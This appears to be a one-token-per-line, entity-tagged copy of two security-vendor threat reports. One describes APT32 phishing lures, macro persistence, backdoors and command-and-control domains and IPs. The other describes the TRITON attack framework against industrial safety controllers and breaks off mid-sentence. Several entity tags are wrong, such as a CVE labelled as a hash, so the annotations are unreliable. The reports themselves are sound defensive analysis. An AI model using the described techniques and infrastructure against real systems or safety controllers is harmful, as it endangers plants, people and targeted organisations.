government
agencies
,
research
institutes
,
maritime
agencies
,
sea
construction
,
and
shipping
enterprises
.

The
information
included
in
the
report
indicated
that
the
perpetrators
used
the
same
malware
,
overlapping
infrastructure
,
and
similar
targets
as
APT32 B_malware.infosteal
.

In
2015
and
2016
,
two
Vietnamese
media
outlets
were
targeted
with
malware
that
FireEye
assesses
to
be
unique
to
APT32 B_malware.infosteal
.

In
2017
,
social
engineering
content
in
lures
used
by
the
actor
provided
evidence
that
they
were
likely
used
to
target
members
of
the
Vietnam
diaspora
in
Australia
as
well
as
government
employees
in
the
Philippines
.

APT32 B_malware.infosteal
Tactics

In
their
current
campaign
,
APT32 B_malware.infosteal
has
leveraged
ActiveMime
files
that
employ
social
engineering
methods
to
entice
2/11
the
victim
into
enabling
macros
.

Upon
execution
,
the
initialized
file
downloads
multiple
malicious
payloads
from
remote
servers
.

APT32 B_malware.infosteal
actors
continue
to
deliver
the
malicious
attachments
via
spear-phishing
emails
.

APT32 B_malware.infosteal
actors
designed
multilingual
lure
documents
which
were
tailored
to
specific
victims
.
Although
the
files
had
'
.doc
'
file
extensions
,
the
recovered
phishing
lures
were
ActiveMime
'
.mht
'
web
page
archives
that
contained
text
and
images
.
These
files
were
likely
created
by
exporting
Word
documents
into
single
file
web
pages
.

Table
2
contains
a
sample
of
recovered
APT32 B_malware.infosteal
multilingual
lure
files
.

ActiveMime
Lure
Files
2017年员工工资性津贴额统计报告.doc
(
2017
Statistical
Report
on
Staff
Salary
and
Allowances
)
5458a2e4d784abb1a1127263bd5006b5  B_hash

Thong
tin.doc
(
Information
)

Phan
Vu
Tutn
CV.doc

Ke
hoach
cuu
tro
nam
2017.doc
(
2017
Bailout
Plan
)

Instructions
to
GSIS.doc

Hoi
thao
truyen
thong
doc
lap.doc
(
Traditional
Games
)
ce50e544430e7265a45fab5a1f31e529  B_hash
4f761095ca51bfbbf4496a4964e41d4f  B_hash
e9abe54162ba4572c770ab043f576784  B_hash
fba089444c769700e47c6b44c362f96b  B_hash
f6ee4b72d6d42d0c7be9172be2b817c1  B_hash

Giấy
yêu
cầu
bồi
thường
mới
2016
-
hằng.doc
(
New
2016
Claim
Form
)
aa1f85de3e4d33f31b4f78968b29f175  B_hash

Hoa
don
chi
tiet
tien
no.doc
(
Debt
Details
)

Thu
moi
tham
du
Hoi
luan.doc
(
Collection
of
Participants
)

Danh
sach
nhan
vien
vi
pham
ky
luat.doc
(
List
of
Employee
Violations
)
̂i-dung-quả
ng-cá
o.doc
(
Internal
Content
Advertising
)

HĐ
DVPM-VTC
31.03.17.doc

Table
2
:
Sampling
of
APT32 B_malware.infosteal
Lure
Files
5180a8d9325a417f2d8066f9226a5154  B_hash
f6ee4b72d6d42d0c7be9172be2b817c1  B_hash
6baafffa7bf960dec821b627f9653e44  B_hash
471a2e7341f2614b715dc89e803ffcac  B_hash
f1af6bb36cdf3cff768faee7919f0733  B_hash

The
Base64
encoded
ActiveMime
data
also
contained
an
OLE B_malware.unknown
file  I
with
malicious
macros
.

When
opened
,
many
lure
files
displayed
fake
error
messages
in
an
attempt
to
trick
users
into
launching
the
malicious
macros
.

Figure
1
shows
a
fake
Gmail-theme
paired
with
a
hexadecimal
error
code
that
encourages
the
recipient
to
enable
content
to
resolve
the
error
.

Figure
2
displays
another
APT32 B_malware.infosteal
lure
that
used
a
convincing
image
of
a
fake
Windows
error
message
instructing
the
recipient
to
enable
content
to
properly
display
document
font
characters
.

3/11

Figure
1
:
Example
APT32 B_malware.infosteal
Phishing
Lure
–
Fake
Gmail
Error
Message

Figure
2
:
Example
APT32 B_malware.infosteal
Phishing
Lure
–
Fake
Text
Encoding
Error
Message

APT32 B_malware.infosteal
operators
implemented
several
novel
techniques
to
track
the
efficacy
of
their
phishing
,
monitor
the
distribution
of
their
malicious
documents
,
and
establish
persistence
mechanisms
to
dynamically
update
backdoors
injected
into
memory
.

In
order
to
track
who
opened
the
phishing
emails
,
viewed
the
links
,
and
downloaded
the
attachments
in
real-time
,

4/11

APT32 B_malware.infosteal
used
cloud-based
email
analytics
software
designed
for
sales
organizations
.

In
some
instances
,
APT32 B_malware.infosteal
abandoned
direct
email
attachments
altogether
and
relied
exclusively
on
this
tracking
technique
with
links
to
their

ActiveMime
lures
hosted
externally
on
legitimate
cloud
storage
services
.

To
enhance
visibility
into
the
further
distribution
of
their
phishing
lures
,
APT32 B_malware.infosteal
utilized
the
native
web
page
functionality
of
their
ActiveMime
documents
to
link
to
external
images
hosted
on
APT32 B_malware.infosteal
monitored
infrastructure
.

Figure
3
contains
an
example
phishing
lure
with
HTML
image
tags
used
for
additional
tracking
by
APT32 B_malware.infosteal
.

Figure
3
:
Phishing
Lure
Containing
HTML
Image
Tags
for
Additional
Tracking

When
a
document
with
this
feature
is
opened
,
Microsoft
Word
will
attempt
to
download
the
external
image
,
even
if
macros
were
disabled
.
In
all
phishing
lures
analyzed
,
the
external
images
did
not
exist
.

Mandiant
consultants
suspect
that
APT32 B_malware.infosteal
was
monitoring
web
logs
to
track
the
public
IP
address
used
to
request
remote
images
.

When
combined
with
email
tracking
software
,
APT32 B_malware.infosteal
was
able
to
closely
track
phishing
delivery
,
success
rate
,
and
conduct
further
analysis
about
victim
organizations
while
monitoring
the
interest
of
security
firms
.

Once
macros
were
enabled
on
the
target
system
,
the
malicious
macros
created
two
named
scheduled
tasks
as
persistence
mechanisms
for
two
backdoors
on
the
infected
system
.

The
first
named
scheduled
task
launched
an
application
whitelisting
script
protection
bypass
to
execute
a
COM
scriptlet
that
dynamically
downloaded
the
first
backdoor
from
APT32's B_malware.infosteal
infrastructure
and
injected
it
into
memory
.

The
second
named
scheduled
task
,
loaded
as
an

XML
file
to
falsify
task
attributes
,
ran
a
JavaScript
code
block
that
downloaded
and
launched
a
secondary
backdoor
,
delivered
as
a
multi-stage
PowerShell
script
.

In
most
lures
,
one
scheduled
task
persisted
an
APT32-specific
backdoor
and
the
other
scheduled
task
initialized
a
commercially-available
backdoor
as
backup
.

To
illustrate
the
complexity
of
these
lures
,
Figure
4
shows
the
creation
of
persistence
mechanisms
for
recovered

APT32 B_malware.infosteal
lure
'
2017年员工工资性津贴额统计报告.doc
'
.

Figure
4
:
APT32 B_malware.infosteal
ActiveMime
Lures
Create
Two
Named
Scheduled
Tasks

In
this
example
,
a
scheduled
task
named
'
Windows
Scheduled
Maintenance
'
was
created
to
run
Casey
Smith's
'
Squiblydoo
'
App
Whitelisting
bypass
every
30
minutes
.

While
all
payloads
can
be
dynamically
updated
,
at
the
time
of
delivery
,
this
task
launched
a
COM
scriptlet
(
'
.sct
'
file
extension
)
that
downloaded
and
executed
Meterpreter
hosted
on
images.chinabytes[.]info
.

Meterpreter
then
loaded
Cobalt
Strike
BEACON
,
configured
to
communicate
with
80.255.3[.]87 B_ip.unknown
using
the
Safebrowsing
malleable
C2
profile
to
further
blend
in
with
network
traffic
.

A
second
scheduled
task
named
'
Scheduled
Defrags
'
was
created
by
loading
the
raw
task
XML
with
a
backdated
task
creation
timestamp
of
June
2
,
2016
.

This
second
task
ran
'
mshta.exe
'
every
50
minutes
which
launched
an
APT32specific
backdoor
delivered
as
shellcode
in
a
PowerShell
script
,
configured
to
communicate
with
the
domains
5/11
blog.panggin[.]org  B_url.codevia
,
share.codehao[.]net B_url.codevia
,
and
yii.yiihao126[.]net B_url.codevia
.

Figure
5
illustrates
the
chain
of
events
for
a
single
successful
APT32 B_malware.infosteal
phishing
lure
that
dynamically
injects
two
multistage
malware
frameworks
into
memory
.

6/11

Figure
5
:
APT32 B_malware.infosteal
Phishing
Chain
of
Events

The
impressive
APT32 B_malware.infosteal
operations
did
not
stop
after
they
established
a
foothold
in
victim
environments
.

Several

Mandiant
investigations
revealed
that
,
after
gaining
access
,
APT32 B_malware.infosteal
regularly
cleared
select
event
log
entries
and
heavily
obfuscated
their
PowerShell-based
tools
and
shellcode
loaders
with
Daniel
Bohannon's
Invoke-Obfuscation
framework
.

APT32 B_malware.infosteal
regularly
used
stealthy
techniques
to
blend
in
with
legitimate
user
activity
:

During
one
investigation
,
APT32 B_malware.infosteal
was
observed
using
a
privilege
escalation
exploit
(
CVE-2016-7255 B_hash
)
masquerading
as
a
Windows
hotfix
.

In
another
investigation
,
APT32 B_malware.infosteal
compromised
the
McAfee
ePO
infrastructure
to
distribute
their
malware
as
a
software
deployment
task
in
which
all
systems
pulled
the
payload
from
the
ePO
server
using
the
proprietary

SPIPE
protocol
.

APT32 B_malware.infosteal
also
used
hidden
or
non-printing
characters
to
help
visually
camouflage
their
malware
on
a
system
.

For
example
,
APT32 B_malware.infosteal
installed
one
backdoor
as
a
persistent
service
with
a
legitimate
service
name
that
had
a

Unicode
no-break
space
character
appended
to
it
.

Another
backdoor
used
an
otherwise
legitimate
DLL
filename
padded
with
a
non-printing
OS
command
control
code
.

APT32 B_malware.infosteal
Malware
and
Infrastructure

APT32 B_malware.infosteal
appears
to
have
a
well-resourced
development
capability
and
uses
a
custom
suite
of
backdoors
spanning
multiple
protocols
.

APT32 B_malware.infosteal
operations
are
characterized
through
deployment
of
signature
malware
payloads
including
WINDSHIELD
,
KOMPROGO
,
SOUNDBITE
,
and
PHOREAL
.
APT32 B_malware.infosteal
often
deploys
these
backdoors
along
with
the
commercially-available
Cobalt
Strike
BEACON
backdoor
.

APT32 B_malware.infosteal
may
also
possess
backdoor
development
capabilities
for
macOS
.

The
capabilities
for
this
unique
suite
of
malware
is
shown
in
Table
3
.

Malware

Capabilities
7/11

WINDSHIELD

KOMPROGO

SOUNDBITE

PHOREAL

Command
and
control
(
C2
)
communications
via
TCP
raw
sockets

Four
configured
C2s
and
six
configured
ports
–
randomly-chosen
C2/port
for
communications

Registry
manipulation

Get
the
current
module's
file
name

Gather
system
information
including
registry
values
,
user
name
,
computer
name
,
and
current
code
page

File
system
interaction
including
directory
creation
,
file
deletion
,
reading
,
and
writing
files

Load
additional
modules
and
execute
code

Terminate
processes

Anti-disassembly

Fully-featured
backdoor
capable
of
process
,
file
,
and
registry
management

Creating
a
reverse
shell

File
transfers

Running
WMI
queries

Retrieving
information
about
the
infected
system

C2
communications
via
DNS

Process
creation

File
upload

Shell
command
execution

File
and
directory
enumeration/manipulation

Window
enumeration

Registry
manipulation

System
information
gathering

C2
communications
via
ICMP

Reverse
shell
creation

Filesystem
manipulation

Registry
manipulation

Process
creation

File
upload
8/11

BEACON
(
Cobalt

Strike
)

Publicly
available
payload
that
can
inject
and
execute
arbitrary
code
into
processes

Impersonating
the
security
context
of
users

Importing
Kerberos
tickets

Uploading
and
downloading
files

Executing
shell
commands

Configured
with
malleable
C2
profiles
to
blend
in
with
normal
network
traffic

Co-deployment
and
interoperability
with
Metasploit
framework

SMB
Named
Pipe
in-memory
backdoor
payload
that
enables
peer-to-peer
C2
and
pivoting
over
SMB

Table
3
:
APT32  B_malware.infosteal
Malware
and
Capabilities

APT32  B_malware.infosteal
operators
appear
to
be
well-resourced
and
supported
as
they
use
a
large
set
of
domains
and
IP
addresses
as
command
and
control
infrastructure
.

The
FireEye
iSIGHT
Intelligence
MySIGHT
Portal
contains
additional
information
on
these
backdoor
families
based
on
Mandiant
investigations
of
APT32  B_malware.infosteal
intrusions
.

Figure
6
provides
a
summary
of
APT32  B_malware.infosteal
tools
and
techniques
mapped
to
each
stage
of
the
attack
lifecycle
.

Figure
6
:
APT32  B_malware.infosteal
Attack
Lifecycle

Outlook
and
Implications

Based
on
incident
response
investigations
,
product
detections
,
and
intelligence
observations
along
with
additional
publications
on
the
same
operators
,
FireEye
assesses
that
APT32
is
a
cyber
espionage
group
aligned
with

Vietnamese
government
interests
.

The
targeting
of
private
sector
interests
by
APT32  B_malware.infosteal
is
notable
and
FireEye
believes
the
actor
poses
significant
risk
to
companies
doing
business
in
,
or
preparing
to
invest
in
,
the
country
.

While
the
motivation
for
each
APT32  B_malware.infosteal
private
sector
compromise
varied
–
and
in
some
cases
was
unknown
–
the
unauthorized
access
could
serve
as
a
platform
for
law
enforcement
,
intellectual
property
theft
,
or
anticorruption
measures
that
could
ultimately
erode
the
competitive
advantage
of
targeted
organizations
.

Furthermore
,
APT32  B_malware.infosteal
continues
to
threaten
political
activism
and
free
speech
in
Southeast
Asia
and
the
public
sector
worldwide
.

Governments
,
journalists
,
and
members
of
the
Vietnam
diaspora
may
continue
to
be
targeted
.
9/11

While
actors
from
China
,
Iran
,
Russia
,
and
North
Korea
remain
the
most
active
cyber
espionage
threats
tracked
and
responded
to
by
FireEye
,
APT32  B_malware.infosteal
reflects
a
growing
host
of
new
countries
that
have
adopted
this
dynamic
capability
.

APT32  B_malware.infosteal
demonstrates
how
accessible
and
impactful
offensive
capabilities
can
be
with
the
proper
investment
and
the
flexibility
to
embrace
newly-available
tools
and
techniques
.

As
more
countries
utilize
inexpensive
and
efficient
cyber
operations
,
there
is
a
need
for
public
awareness
of
these
threats
and
renewed
dialogue
around
emerging
nationstate
intrusions
that
go
beyond
public
sector
and
intelligence
targets
.

APT32 B_malware.infosteal
Detection

Figure
7
contains
a
Yara
rule
can
be
used
to
identify
malicious
macros
associated
with
APT32's
phishing
lures
:

Figure
7
:
Yara
Rule
for
APT32 B_malware.infosteal
Malicious
Macros

Table
4
contains
a
sampling
of
the
infrastructure
that
FireEye
has
associated
with
APT32 B_malware.infosteal
C2
.

C2
Infrastructure
103.53.197.202  B_ip.normal
104.237.218.70  B_ip.normal
104.237.218.72  B_ip.normal
185.157.79.3  B_ip.normal
193.169.245.78  B_ip.normal
193.169.245.137 B_ip.normal
23.227.196.210  B_ip.normal
24.datatimes.org  B_url.normal
80.255.3.87 B_ip.normal
blog.docksugs.org B_url.normal
blog.panggin.org  B_url.normal
contay.deaftone.com B_url.normal
check.paidprefund.org B_url.normal
datatimes.org B_url.normal
docksugs.org  B_url.normal
economy.bloghop.org B_url.normal
emp.gapte.name  B_url.normal
facebook-cdn.net  B_url.normal
gap-facebook.com  B_url.normal
gl-appspot.org  B_url.normal
help.checkonl.org B_url.normal
high.expbas.net B_url.normal
high.vphelp.net B_url.normal
icon.torrentart.com B_url.normal
10/11
images.chinabytes.info  B_url.normal
imaps.qki6.com  B_url.normal
img.fanspeed.net  B_url.normal
job.supperpow.com B_url.normal
lighpress.info  B_url.normal
menmin.strezf.com B_url.normal
mobile.pagmobiles.info  B_url.normal
news.lighpress.info B_url.normal
notificeva.com  B_url.normal
nsquery.net B_url.normal
pagmobiles.info B_url.normal
paidprefund.org B_url.normal
push.relasign.org B_url.normal
relasign.org  B_url.normal
share.codehao.net B_url.normal
seri.volveri.net  B_url.normal
syn.timeizu.net B_url.normal
tonholding.com  B_url.normal
ssl.zin0.com  B_url.normal
teriava.com B_url.normal
static.jg7.org  B_url.normal
timeizu.net B_url.normal
tulationeva.com B_url.normal
untitled.po9z.com B_url.normal
update-flashs.com B_url.normal
vieweva.com B_url.normal
volveri.net B_url.normal
vphelp.net  B_url.normal
yii.yiihao126.net B_url.normal
zone.apize.net  B_url.normal

Table
4
:
Sampling
of
APT32
C2
Infrastructure
11/11
Attackers
Deploy
New
ICS
Attack
Framework
'
TRITON  B_malware.infosteal
'
and
Cause
Operational
Disruption
to
Critical
Infrastructure
www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html  B_url.normal

Introduction

Mandiant
recently
responded
to
an
incident
at
a
critical
infrastructure
organization
where
an
attacker
deployed
malware
designed
to
manipulate
industrial
safety
systems
.

The
targeted
systems
provided
emergency
shutdown
capability
for
industrial
processes
.

We
assess
with
moderate
confidence
that
the
attacker
was
developing
the
capability
to
cause
physical
damage
and
inadvertently
shutdown
operations
.

This
malware
,
which
we
call
TRITON  B_malware.infosteal
,
is
an
attack
framework
built
to
interact
with
Triconex B_malware.unknown
Safety
Instrumented
System
(
SIS
)
controllers
.

We
have
not
attributed
the
incident
to
a
threat
actor
,
though
we
believe
the
activity
is
consistent
with
a
nation
state
preparing
for
an
attack
.

TRITON  B_malware.infosteal
is
one
of
a
limited
number
of
publicly
identified
malicious
software
families
targeted
at
industrial
control
systems
(
ICS
)
.

It
follows
Stuxnet
which
was
used
against
Iran
in
2010
and

Industroyer
which
we
believe
was
deployed
by
Sandworm
Team
against
Ukraine
in
2016
.

TRITON  B_malware.infosteal
is
consistent
with
these
attacks
,
in
that
it
could
prevent
safety
mechanisms
from
executing
their
intended
function
,
resulting
in
a
physical
consequence
.

Malware

Family

Main

Modules

Description

TRITON  B_malware.infosteal
trilog.exe

Main
executable
leveraging
libraries.zip
library.zip

Custom
communication
library
for
interaction
with
Triconex B_malware.unknown
controllers
.

Table
1
:
Description
of
TRITON  B_malware.infosteal
Malware

Incident
Summary

The
attacker
gained
remote
access
to
an
SIS
engineering
workstation
and
deployed
the

TRITON  B_malware.infosteal
attack
framework
to
reprogram
the
SIS
controllers
.

During
the
incident
,
some
SIS
controllers
entered
a
failed
safe
state
,
which
automatically
shutdown
the
industrial
process
and
prompted
the
asset
owner
to
initiate
an
investigation
.

The
investigation
found
that
the
SIS
controllers
initiated
a
safe
shutdown
when
application
code
between
redundant
processing
units
failed
a
validation
check
--
resulting
in
an
MP
diagnostic
failure
message
.

We
assess
with
moderate
confidence
that
the
attacker
inadvertently
shutdown
operations
while
developing
the
ability
to
cause
physical
damage
for
the
following
reasons
:
1/10

Modifying
the
SIS
could
prevent
it
from
functioning
correctly
,
increasing
the
likelihood
of
a
failure
that
would
result
in
physical
consequences
.

TRITON  B_malware.infosteal
was
used
to
modify
application
memory
on
SIS
controllers
in
the
environment
,
which
could
have
led
to
a
failed
validation
check
.

The
failure
occurred
during
the
time
period
when
TRITON
was
used
.

It
is
not
likely
that
existing
or
external
conditions
,
in
isolation
,
caused
a
fault
during
the
time
of
the
incident
.

Attribution

FireEye
has
not
connected
this
activity
to
any
actor
we
currently
track;
however
,
we
assess
with
moderate
confidence
that
the
actor
is
sponsored
by
a
nation
state
.

The
targeting
of
critical
infrastructure
as
well
as
the
attacker's
persistence
,
lack
of
any
clear
monetary
goal
and
the
technical
resources
necessary
to
create
the
attack
framework
suggest
a
well-resourced
nation
state
actor
.

Specifically
,
the
following
facts
support
this
assessment
:

The
attacker
targeted
the
SIS
suggesting
an
interest
in
causing
a
high-impact
attack
with
physical
consequences
.

This
is
an
attack
objective
not
typically
seen
from
cyber-crime
groups
.

The
attacker
deployed
TRITON  B_malware.infosteal
shortly
after
gaining
access
to
the
SIS
system
,
indicating
that
they
had
pre-built
and
tested
the
tool
which
would
require
access
to
hardware
and
software
that
is
not
widely
available
.

TRITON  B_malware.infosteal
is
also
designed
to
communicate
using
the
proprietary

TriStation
protocol
which
is
not
publicly
documented
suggesting
the
adversary
independently
reverse
engineered
this
protocol
.

The
targeting
of
critical
infrastructure
to
disrupt
,
degrade
,
or
destroy
systems
is
consistent
with
numerous
attack
and
reconnaissance
activities
carried
out
globally
by
Russian
,
Iranian
,
North

Korean
,
U.S.
,
and
Israeli
nation
state
actors
.

Intrusions
of
this
nature
do
not
necessarily
indicate
an
immediate
intent
to
disrupt
targeted
systems
,
and
may
be
preparation
for
a
contingency
.

Background
on
Process
Control
and
Safety
Instrumented
Systems
2/10

Figure
1
:
ICS
Reference
Architecture

Modern
industrial
process
control
and
automation
systems
rely
on
a
variety
of
sophisticated
control
systems
and
safety
functions
.
These
systems
and
functions
are
often
referred
to
as

Industrial
Control
Systems
(
ICS
)
or
Operational
Technology
(
OT
)
.

A
Distributed
Control
System
(
DCS
)
provides
human
operators
with
the
ability
to
remotely
monitor
and
control
an
industrial
process
.

It
is
a
computerized
control
system
consisting
of
computers
,
software
applications
and
controllers
.
An
Engineering
Workstation
is
a
computer
used
for
configuration
,
maintenance
and
diagnostics
of
the
control
system
applications
and
other
control
system
equipment
.

A
SIS
is
an
autonomous
control
system
that
independently
monitors
the
status
of
the
process
under
control
.

If
the
process
exceeds
the
parameters
that
define
a
hazardous
state
,
the
SIS
attempts
to
bring
the
process
back
into
a
safe
state
or
automatically
performs
a
safe
shutdown
of
the
process
.

If
the
SIS
and
DCS
controls
fail
,
the
final
line
of
defense
is
the
design
of
the
industrial
facility
,
which
includes
mechanical
protections
on
equipment
(
e.g.
rupture
discs
)
,
physical
alarms
,
emergency
response
procedures
and
other
mechanisms
to
mitigate
3/10
dangerous
situations
.

Asset
owners
employ
varied
approaches
to
interface
their
plant's
DCS
with
the
SIS
.

The
traditional
approach
relies
on
the
principles
of
segregation
for
both
communication
infrastructures
and
control
strategies
.

For
at
least
the
past
decade
,
there
has
been
a
trend
towards
integrating
DCS
and
SIS
designs
for
various
reasons
including
lower
cost
,
ease
of
use
,
and
benefits
achieved
from
exchanging
information
between
the
DCS
and
SIS
.

We
believe
TRITON
acutely
demonstrates
the
risk
associated
with
integrated
designs
that
allow
bidirectional
communication
between
DCS
and
SIS
network
hosts
.

Safety
Instrumented
Systems
Threat
Model
and
Attack
Scenarios

Figure
2
:
Temporal
Relationship
Between
Cyber
Security
and
Safety

The
attack
lifecycle
for
disruptive
attacks
against
ICS
is
similar
to
other
types
of
cyber
attacks
,
with
a
few
key
distinctions
.

First
,
the
attacker's
mission
is
to
disrupt
an
operational
process
rather
than
steal
data
.

Second
,
the
attacker
must
have
performed
OT
reconnaissance
and
have
sufficient
specialized
engineering
knowledge
to
understand
the
industrial
process
being
controlled
and
successfully
manipulate
it
.

Figure
2
represents
the
relationship
between
cyber
security
and
safety
controls
in
a
process
control
environment
.

Even
if
cyber
security
measures
fail
,
safety
controls
are
designed
to
prevent
physical
damage
.
To
maximize
physical
impact
,
a
cyber
attacker
would
also
need
to
bypass
safety
controls
.

The
SIS
threat
model
below
highlights
some
of
the
options
available
to
an
attacker
who
has
successfully
compromised
an
SIS
.

4/10

Attack
Option
1
:
Use
the
SIS
to
shutdown
the
process

The
attacker
can
reprogram
the
SIS
logic
to
cause
it
to
trip
and
shutdown
a
process
that
is
,
in
actuality
,
in
a
safe
state
.

In
other
words
,
trigger
a
false
positive
.

Implication
:
Financial
losses
due
to
process
downtime
and
complex
plant
start
up
procedure
after
the
shutdown
.

Attack
Option
2
:
Reprogram
the
SIS
to
allow
an
unsafe
state

The
attacker
can
reprogram
the
SIS
logic
to
allow
unsafe
conditions
to
persist
.

Implication
:
Increased
risk
that
a
hazardous
situation
will
cause
physical
consequences
(
e.g.
impact
to
equipment
,
product
,
environment
and
human
safety
)
due
to
a
loss
of
SIS
functionality
.

Attack
Option
3
:
Reprogram
the
SIS
to
allow
an
unsafe
state
–
while
using
the
DCS
to
create
an
unsafe
state
or
hazard

The
attacker
can
manipulate
the
process
into
an
unsafe
state
from
the
DCS
while
preventing
the
SIS
from
functioning
appropriately
.

Implication
:
Impact
to
human
safety
,
the
environment
,
or
damage
to
equipment
,
the
extent
of
which
depends
on
the
physical
constraints
of
the
process
and
the
plant
design
.

Analysis
of
Attacker
Intent

We
assess
with
moderate
confidence
that
the
attacker's
long-term
objective
was
to
develop
the
capability
to
cause
a
physical
consequence
.

We
base
this
on
the
fact
that
the
attacker
initially
obtained
a
reliable
foothold
on
the
DCS
and
could
have
developed
the
capability
to
manipulate
the
process
or
shutdown
the
plant
,
but
instead
proceeded
to
compromise
the
SIS
system
.

Compromising
both
the
DCS
and
SIS
system
would
enable
the
attacker
to
develop
and
carry
out
an
attack
that
causes
the
maximum
amount
of
damage
allowed
by
the
physical
and
mechanical
safeguards
in
place
.

Once
on
the
SIS
network
,
the
attacker
used
their
pre-built
TRITON  B_malware.infosteal
attack
framework
to
interact
with
the
SIS
controllers
using
the
TriStation
protocol
.

The
attacker
could
have
caused
a
process
shutdown
by
issuing
a
halt
command
or
intentionally
uploading
flawed
code
to
the

SIS
controller
to
cause
it
to
fail
.

Instead
,
the
attacker
made
several
attempts
over
a
period
of
time
to
develop
and
deliver
functioning
control
logic
for
the
SIS
controllers
in
this
target
environment
.

While
these
attempts
appear
to
have
failed
due
one
of
the
attack
scripts
'
conditional
checks
,
the
attacker
persisted
with
their
efforts
.

This
suggests
the
attacker
was
intent
on
causing
a
specific
outcome
beyond
a
process
shutdown
.

Of
note
,
on
several
occasions
,
we
have
observed
evidence
of
long
term
intrusions
into
ICS
which
were
not
ultimately
used
to
disrupt
or
disable
operations
.
For
instance
,
Russian
operators
,
such
as
Sandworm
Team
,
have
compromised
Western
ICS
over
a
multi-year
period
without
causing
a
disruption
.

Summary
of
Malware
Capabilities
5/10

The
TRITON  B_malware.infosteal
attack
tool
was
built
with
a
number
of
features
,
including
the
ability
to
read
and
write
programs
,
read
and
write
individual
functions
and
query
the
state
of
the
SIS
controller
.

However
,
only
some
of
these
capabilities
were
leveraged
in
the
trilog.exe
sample
(
e.g.
the
attacker
did
not
leverage
all
of
TRITON's  B_malware.unknown
extensive
reconnaissance
capabilities
)
.

The
TRITON  B_malware.infosteal
malware
contained
the
capability
to
communicate
with
Triconex B_malware.unknown
SIS
controllers
(
e.g.
send
specific
commands
such
as
halt
or
read
its
memory
content
)
and
remotely
reprogram
them
with
an
attacker-defined
payload
.

The
TRITON  B_malware.infosteal
sample
Mandiant
analyzed
added
an
attacker-provided
program
to
the
execution
table
of
the
Triconex B_malware.unknown
controller
.

This
sample
left
legitimate
programs
in
place
,
expecting
the
controller
to
continue
operating
without
a
fault
or
exception
.
If
the
controller
failed
,
TRITON  B_malware.infosteal
would
attempt
to
return
it
to
a
running
state
.

If
the
controller
did
not
recover
within
a
defined
time
window
,
this
sample
would
overwrite
the
malicious
program
with
invalid
data
to
cover
its
tracks
.

Recommendations

Asset
owners
who
wish
to
defend
against
the
capabilities
demonstrated
in
the
incident
,
should
consider
the
following
controls
:

Where
technically
feasible
,
segregate
safety
system
networks
from
process
control
and
information
system
networks
.

Engineering
workstations
capable
of
programming
SIS
controllers
should
not
be
dual-homed
to
any
other
DCS
process
control
or
information
system
network
.

Leverage
hardware
features
that
provide
for
physical
control
of
the
ability
to
program
safety
controllers
.

These
usually
take
the
form
of
switches
controlled
by
a
physical
key
.

On
Triconex B_malware.unknown
controllers
,
keys
should
not
be
left
in
the
PROGRAM
mode
other
than
during
scheduled
programming
events
.

Implement
change
management
procedures
for
changes
to
key
position
.
Audit
current
key
state
regularly
.

Use
a
unidirectional
gateway
rather
than
bidirectional
network
connections
for
any
applications
that
depend
on
the
data
provided
by
the
SIS
.

Implement
strict
access
control
and
application
whitelisting
on
any
server
or
workstation
endpoints
that
can
reach
the
SIS
system
over
TCP/IP
.

Monitor
ICS
network
traffic
for
unexpected
communication
flows
and
other
anomalous
activity
.

6/10

Figure
3
:
Triconex B_malware.unknown
Key
Switch
(
source
)

Appendix
:
Technical
Analysis

Figure
4
:
TRITON  B_malware.infosteal
Architecture
and
Attack
Scenario

TRITON  B_malware.infosteal
was
deployed
on
an
SIS
engineering
workstation
running
the
Microsoft
Windows
operating
system
.

The
malware
was
named
to
masquerade
as
the
legitimate
Triconex B_malware.unknown
Trilog
application
.

This
application
is
used
for
reviewing
logs
and
is
a
part
of
the
TriStation
application
suite
.

The
malware
was
delivered
as
a
Py2EXE
compiled
python
script
dependent
on
a
zip
file
containing
standard
Python
libraries
,
open
source
libraries
,
as
well
as
the
attacker
7/10

developed
Triconex B_malware.unknown
attack
framework
for
interacting
with
the
Triconex B_malware.unknown
controllers
.

Along
with
the
executable
,
two
binary
files
,
inject.bin
(
malicious
function
code
)
and
imain.bin
(
malicious
control
logic
)
,
were
deployed
as
the
controller's
payload
.

These
file
names
were
hard
coded
in
the
Py2EXE
compiled
python
script
.

Trilog.exe
took
one
option
from
the
command
line
,
which
was
a
single
IP
address
of
the
target

Triconex B_malware.unknown
device
.

It
did
not
leverage
the
underlying
TRITON  B_malware.infosteal
library's
capability
for
Triconex B_malware.unknown
device
discovery
,
instead
an
instance
of
trilog.exe
had
to
be
invoked
separately
for
each
target
controller
in
the
environment
.

Once
invoked
,
trilog.exe
checked
the
status
of
the
controller
,
then
read
the
configuration
information
exposed
by
the
TriStation
protocol
.

If
the
controller
was
in
a
running
state
,
trilog.exe
encoded
the
two
payload
files
inject.bin
and
imain.bin
and
passed
them
to
the
communication
libraries
to
be
appended
to
the
controller's
program
memory
and
execution
table
.

After
payload
files
were
inserted
into
memory
on
the
Triconex B_malware.unknown
controller
,
the
script
initiated
a
countdown
,
periodically
checking
the
status
of
the
controller
.
If
an
error
was
detected
,
the
communication
library's
method
SafeAppendProgramMod
attempted
to
reset
the
controller
to
the
previous
state
using
a
TriStation
protocol
command
.
If
this
failed
,
trilog.exe
attempted
to
write
a
small
'
dummy
'
program
to
memory
.
We
assess
that
this
was
an
anti-forensics
technique
to
hide
the
presence
of
the
attacker
code
on
the
Triconex B_malware.unknown
controller
.

Working
with
the
asset
owner
,
Mandiant
ran
trilog.exe
in
a
lab
environment
with
a
valid

Triconex B_malware.unknown
controller
and
discovered
a
conditional
check
in
the
malware
that
prevented
the
payload
binary
from
persisting
in
the
environment
.
Mandiant
confirmed
that
,
after
correcting
patching
the
attack
script
to
remove
this
check
,
the
payload
binary
would
persist
in
controller
memory
,
and
the
controller
would
continue
to
run
.

TRITON  B_malware.infosteal
implements
the
TriStation
protocol
,
which
is
the
protocol
used
by
the
legitimate

TriStation
application
,
to
configure
controllers
.

TsHi  B_malware.unknown
is
the
high-level
interface
created
by
the
malware's
authors
that
allows
the
threat
actor's
operators
to
implement
attack
scripts
using
the
TRITON  B_malware.infosteal
framework
.
It
exposes
functions
for
both
reconnaissance
and
attack
.
The
functions
generally
accept
binary
data
from
the
user
,
and
handle
the
code
'
signing
'
and
check
sums
prior
to
passing
the
data
to
lower
level
libraries
for
serialization
on
to
the
network
.

TsBase
,
another
attacker-written
module
,
contains
the
functions
called
by
TsHi  B_malware.unknown
,
which
translate
the
attacker's
intended
action
to
the
appropriate
TriStation
protocol
function
code
.
For
certain
functions
,
it
also
packs
